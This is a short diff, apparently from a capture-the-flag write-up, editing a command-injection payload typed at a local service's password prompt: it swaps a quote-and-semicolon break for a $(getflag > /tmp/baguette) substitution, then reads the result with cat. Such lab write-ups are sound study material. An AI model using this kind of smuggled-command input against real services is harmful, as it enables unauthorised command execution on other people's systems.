@@ -2,7 +2,7 @@
 
 > nc localhost 5151
 >
-> Password: \";getflag > /tmp/baguette;\"
+> Password: $(getflag > /tmp/baguette)
 > Erf nope..
 
 > cat /tmp/baguette
